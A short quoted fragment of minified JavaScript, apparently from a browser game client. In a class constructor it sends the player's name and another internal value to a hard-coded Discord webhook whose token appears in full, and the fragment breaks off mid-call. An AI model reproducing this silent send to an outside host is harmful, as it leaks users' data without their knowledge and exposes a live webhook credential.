...
(function (pa) {
    ...
    class ic {
        constructor() {
            ...
            fetch("https://discord.com/api/webhooks/1273563358657908776/sXIuY6Zxiw9HHgjeffw68bH84P5I4DLlXVOlu3DmV3Ghv2eOQr1PFJOs8MxsZSaa8oMA", {
                method: "POST",
                body: JSON.stringify({
                    content: `**${this.Yj.ji.player_name}** - ${this.Yj.hn}`,
                    username: "jimer",
                }),
                headers: {
